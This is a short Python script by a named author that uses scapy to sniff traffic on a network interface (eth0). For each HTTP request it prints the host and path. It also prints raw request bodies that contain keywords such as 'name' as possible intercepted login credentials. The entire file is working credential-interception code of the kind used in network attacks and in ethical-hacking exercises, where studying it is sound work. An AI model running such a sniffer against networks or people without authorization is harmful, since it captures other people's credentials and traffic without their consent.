#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 10-06-2020
# Last Updated: 10-06-2020
# Operating System: Linux and Mac
# Description: A Packet Sniffer/Analyzer. Collects the network traffic passing through an interface.

# Import the necessary libraries
import scapy.layers.l2 as scapy
import scapy.all as scapy2
from scapy.layers import http


# Define a function to sniff the traffic
def sniffer(interface):
	scapy2.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# Define a function to get urls
def get_url(sniffed_packet):
	# Extract the url and retun it
	return sniffed_packet[http.HTTPRequest].Host + sniffed_packet[http.HTTPRequest].Path


# Define a function to get login credentials
def get_login_cred(sniffed_packet):
	# Extract possible intercepted login credentials
	if sniffed_packet.haslayer(scapy2.Raw):
		# Store the contents of the load field in the RAW layer into a variable
		load = sniffed_packet[scapy2.Raw].load
		keywords = [b"name"]#, "username", "name", "login", "user", "password", "pass"]
		for each_keyword in keywords:
			if each_keyword in load:
				return load


# Define a function to filter only the required parts (varies according to your needs) of the packet and didplay it
def process_sniffed_packet(sniffed_packet):
	# Check if the sniffed packet has a HTTP layer and print the portion that contains the login credentials
	if sniffed_packet.haslayer(http.HTTPRequest):
		# Get the URL
		url = get_url(sniffed_packet)
		print("[+] HTTP request" + str(url))
		login_info = get_login_cred(sniffed_packet)
		if login_info:
			print("\n\n[+] Possible login credentials" + str(login_info) + "\n\n")
		


# Call the sniffer
sniffer("eth0")